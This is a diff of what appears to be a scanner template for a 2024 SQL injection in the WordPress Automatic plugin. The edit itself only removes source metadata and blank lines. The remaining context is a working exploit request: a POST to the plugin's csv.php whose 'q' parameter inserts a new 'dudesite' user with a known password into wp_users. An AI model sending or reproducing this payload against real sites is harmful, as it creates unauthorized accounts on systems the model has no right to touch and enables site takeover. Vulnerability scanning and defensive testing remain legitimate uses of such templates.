@@ -3,12 +3,8 @@ info:
   name: WordPress Automatic SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lm5ppe5rl5h6eda1'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lm5ppe5rl5h6eda1
-    fofa: 暂无
 http:
 - raw:
   - 'POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1
@@ -36,8 +32,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     q=INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status) VALUES (''dudesite'', MD5(''dudesite''), ''dudesite'', ''dudesite@localhost.org'', NOW(), 0);&auth=%20&integ=5be638728303f002fd54450e5866dd28
